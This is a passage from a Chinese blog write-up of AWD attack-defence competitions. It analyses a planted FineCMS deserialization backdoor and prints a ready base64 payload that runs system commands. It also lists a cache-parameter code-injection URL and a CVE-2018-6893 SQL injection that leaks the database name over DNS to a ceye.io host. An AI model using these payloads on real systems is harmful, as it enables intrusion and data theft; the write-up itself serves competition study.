</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$key</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>SetFilter</span><span class=p>(</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>开头看起来有个马的样子。</p><p>直接定位该文件的引用位置:<code>finecms/Init.php</code>，看到关键函数这里，我们可以看到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;FINECMS_CONFIG&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$config</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;FINECMS_CONFIG&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>require</span> <span class=nx>FCPATH</span><span class=o>.</span><span class=s1>&#39;dayrui/config/config.class.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>在<code>index.php</code>可以找到<code>FCPATH</code>的<code>define</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;FCPATH&#39;</span><span class=p>,</span> <span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;/finecms/&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>所以上面那段代码就是把这个<code>config.class.php</code>给引入进来。而<code>$config</code>由<code>Init.php</code>中的<code>cookie</code>中的<code>FINECMS_CONFIG</code>取得。</p><p>整个代码逻辑就是先获取<code>cookie</code>中的<code>FINECOMS_CONFIG</code>的参数，然后调用<code>config.class.php</code>，先对<code>$config</code>进行<code>base64</code>解码，再进行反序列化，检查是否有<code>GET</code>请求传参，有的话就访问<code>$config->$param</code>。</p><p>而在<code>SetFilter($value)</code>函数中我们可以看到有<code>call_user_func($filter,$value);</code>，这里我们可以利用任意命令执行漏洞。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>call_user_func</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>,</span><span class=s1>&#39;ls&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>如此可以直接执行<code>system(ls)</code>。所以我们需要让<code>call_user_func($filter,$value);</code>中的参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$filter</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span><span class=c1>//$value即为函数传参
</span></span></span></code></pre></td></tr></table></div></div><p>所以我们先构造一个<code>$FinecmsConfig</code>对象实例，将其序列化。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>FinecmsConfig</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$config</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filter</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$fine</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>FinecmsConfig</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$fine</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>将得到的<code>base64</code>加密后的字符串传入<code>$config</code>，传入参数<code>$param</code>实现任意命令执行。测试代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$config</span> <span class=o>=</span> <span class=s1>&#39;TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ==&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$param</span> <span class=o>=</span> <span class=s1>&#39;ls&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$config</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$config</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$param</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$config</span><span class=o>-&gt;</span><span class=nv>$param</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>在这里，反序列化之后调用的<code>__wakeup()</code>这个魔术函数，而上段代码中并没有，所以并不会产生什么影响。</p><blockquote><p>若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 <a class=link href=http://php.net/manual/zh/language.oop5.magic.php#object.wakeup target=_blank rel=noopener>__wakeup()</a> 成员函数（如果存在的话）。</p></blockquote><p>好，我们全部梳理一遍，真正利用的点就是在<code>SetFilter</code>利用<code>call_user_func</code>这个函数，而调用<code>SetFilter</code>的函数就是<code>__get()</code>这个魔术方法，这个魔术方法的触发条件是：</p><blockquote><p>当调用当前环境下未定义或不<a class=link href=http://php.net/manual/zh/language.oop5.visibility.php target=_blank rel=noopener>可见</a>的类属性或方法时，重载方法会被调用。</p><p>也就是说如果我们访问一个实例不存在的成员，或者私有成员变量的话，就会触发</p></blockquote><p>所以，<code>$config->$param;</code>在这里触发，而<code>$param</code>可控，而且它也作为是<code>call_user_func</code>的传入回调函数的参数，就造成了任意代码利用</p><p>所以整个代码的漏洞利用，应该是先构造一个<code>$filter=array('system')</code>的<code>FinecmsConfig</code>实例，因为原代码中是需要先<code>base64</code>解码之后再反序列化，我们就先将其序列化之后再用<code>base64</code>加密，得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ==
</span></span></code></pre></td></tr></table></div></div><p>即可用<code>GET</code>参数<code>param</code>任意命令执行。</p><h4 id=poc-4-1>Poc 4</h4><p>详细见：</p><blockquote><p><a class=link href=https://zhuanlan.zhihu.com/p/35133267 target=_blank rel=noopener>https://zhuanlan.zhihu.com/p/35133267</a></p><p><a class=link href=http://lu4n.com/finecms-rce-0day/ target=_blank rel=noopener>http://lu4n.com/finecms-rce-0day/</a></p></blockquote><p>payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://localhost/index.php?c=Api&amp;m=html&amp;name=search&amp;format=html&amp;params={&#34;search_sql&#34;:&#34;action=cache name=block.L]=phpinfo()&amp;$cache[L&#34;}
</span></span></code></pre></td></tr></table></div></div><h4 id=poc-5>Poc 5</h4><p>cms自带漏洞：编号CVE-2018-6893</p><p>详细见：</p><blockquote><p><a class=link href=https://bbs.ichunqiu.com/thread-36673-1-1.html target=_blank rel=noopener>https://bbs.ichunqiu.com/thread-36673-1-1.html</a></p></blockquote><blockquote><p>/index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=13&amp;title=123&amp;module=news,(selectload_file(concat(0x5c5c5c5c,database(),0x2e6e65766a32372e636579652e696f5c5c616461)))as total</p></blockquote><h2 id=总结>总结</h2><p>主要是自己在这方面积累的并不多吧，西湖那次说实话确实有点水分，挺作秀的。比赛水平并不是很高，自己跟队友也是混到了第6左右，也是个人的第二次攻防赛；第三次攻防赛稍微对上次有点经验，不过还是自己见识太少了，太菜了&mldr;排名比较靠中，也是因为都是通过线上赛筛选过来的队伍，所以实力都很强。不得不说的是，红帽杯的web2的<code>checker</code>只检查<code>index.php</code>和<code>admin.php</code>，我们删了很多其他东西，就稳定得分了。。一方面是记录流量的准备不是很充分，<code>waf</code>也并没有准备，基本就是准备了一些心理准备吧hhhh。对于不死马的处理以及对于自己对自己的维护环境没有权限的情况没有经验，这里可以简述一下前面两者的处理方法，不死马的处理可以通过覆写一句话马的文件或者重启<code>web</code>服务，对于自己<code>web</code>目录没有权限的情况可以自己拿自己的<code>shell</code>达到获取权限的目的。</p><p>之后可能会写一写攻防赛的经验总结吧&mldr;还是得等这段期末过吧..</p></section><footer class=article-footer><section class=article-tags><a href=/tags/awd/>AWD</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/%E5%8E%A6%E5%A4%A7%E6%97%85%E6%B8%B8%E5%B0%8F%E8%AE%B0/><div class=article-details><h2 class=article-title>厦大旅游小记</h2></div></a></article><article><a href=/p/writeup-for-a-more-secure-pastebin-practical-timeless-timing-in-browser/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/p/hxp-ctf-2021-the-end-of-lfi/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/p/hxp-ctf-2021-a-new-novel-lfi/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/p/writeup-for-web-checkin-in-cybrics-ctf-2021-mirror/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=ZeddYu/ZeddYu.github.io data-repo-id="MDEwOlJlcG9zaXRvcnkzMzgyODQ1OTY=" data-category=Announcements data-category-id=DIC_kwDOFCnQNM4ClsKy data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading=lazy crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script></body></html>